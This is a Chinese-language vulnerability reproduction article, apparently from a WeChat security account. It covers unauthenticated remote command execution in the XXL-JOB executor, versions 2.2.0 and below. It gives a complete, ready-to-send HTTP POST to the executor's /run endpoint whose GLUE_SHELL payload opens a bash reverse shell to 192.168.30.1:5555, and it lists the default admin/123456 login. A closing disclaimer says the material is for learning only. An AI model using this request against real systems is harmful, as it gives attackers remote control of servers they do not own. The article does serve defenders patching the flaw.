<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SQ7N52dizTC45oGI6gY3cg)

**1、概述**  

XXL-JOB 是一个轻量级分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。XXL-JOB 分为 admin 和 executor 两端，前者为后台管理页面，后者是任务执行的客户端。executor 默认没有配置认证，未授权的攻击者可以通过 RESTful API 执行任意命令。此次漏洞核心问题是 GLUE 模式。XXL-JOB 通过 “GLUE 模式” 支持多语言以及脚本任务，该模式任务特点如下：

```
多语言支持：支持 Java、Shell、Python、NodeJS、PHP、PowerShell……等类型。
Web IDE：任务以源码方式维护在调度中心，支持通过 Web IDE 在线开发、维护。
动态生效：用户在线通过 Web IDE 开发的任务代码，远程推送至执行器，实时加载执行。

```

**2、漏洞影响版本**

影响版本： XXL-JOB <= 2.2.0

**3、漏洞复现过程**

XXL-JOB 的 Restful API 分为两种，一个 调度中心 Restful API，一个 执行器 Restful API。其中在执行器 Restful API 的任务触发声明中，发送请求的数据格式为：

```
地址格式：
    {执行器内嵌服务跟地址}/run   //也就是说为executor端的地址，ip:9999/run
Header：
    XXL-JOB-ACCESS-TOKEN : {请求令牌}   
请求数据格式如下，放置在 RequestBody 中，JSON格式：
{ 
    "jobId":1, // 任务ID 
    "executorHandler":"demoJobHandler", // 任务标识 
    "executorParams":"demoJobHandler", // 任务参数 
    "executorBlockStrategy":"COVER_EARLY", // 任务阻塞策略，可选值参考   com.xxl.job.core.enums.ExecutorBlockStrategyEnum 
    "executorTimeout":0, // 任务超时时间，单位秒，大于零时生效 
    "logId":1, // 本次调度日志ID 
    "logDateTime":1586629003729, // 本次调度日志时间 
    "glueType":"BEAN", // 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum     "glueSource":"xxx", // GLUE脚本代码 
    "glueUpdatetime":1586629003727, // GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新 
    "broadcastIndex":0, // 分片参数：当前分片 
    "broadcastTotal":0 // 分片参数：总分片 
} 
响应数据格式：
    { "code": 200, // 200 表示正常、其他失败 "msg": null // 错误提示消息 }

```

可以直接向客户端发送如下数据包，即可执行命令, 这里复现我们直接通过反弹 shell 进行演示：

```
POST /run HTTP/1.1
Host: ip
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 365
{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "/bin/bash -i >& /dev/tcp/192.168.30.1/5555 0>&1",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}

```

首先访问复现环境。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmprZhKaxroGkLxbgq5wW3sqXBeV0KoYKwZ8JMCzgX2Ha285kkicsHzepbgYyVibe6brUawWygfyJLYQ/640?wx_fmt=png)

如果复现环境是自己搭建的，环境启动后，访问 `http://your-ip:8080` 即可查看到管理端（admin），访问 `http://your-ip:9999` 可以查看到客户端（executor）。默认登录账号口令是：“admin/123456”

访问环境后，接着使用 hackbar 发送 post 数据，进行反弹 shell 操作。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmprZhKaxroGkLxbgq5wW3sqVsf9mfNyoZxAfQzeqmnO6wPQicJysSZpV6ebdlMrbkgiaK4AHH59FQfw/640?wx_fmt=png)

点击执行后数据包发送成功，并成功反弹 shell。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmprZhKaxroGkLxbgq5wW3sqNcmw9XBgic3SYzQwCIa7VZun6srJyGdfwMkq0ZtZH5ibERqdjzicnuCBw/640?wx_fmt=png)

至此漏洞复现完毕。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UpWGe2KIPmprZhKaxroGkLxbgq5wW3sqiaAnZ3O0nK1Led1URrZ6LucwS43eicjpyWDiciavENz75VL0ZEgPvKVjdw/640?wx_fmt=png)

**免责声明：  
**

**本公众号漏洞复现文章，SRC、渗透测试等文章，仅供学习参考，请勿用于实战！！有授权情况下除外！！由于传播、利用本公众号文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责**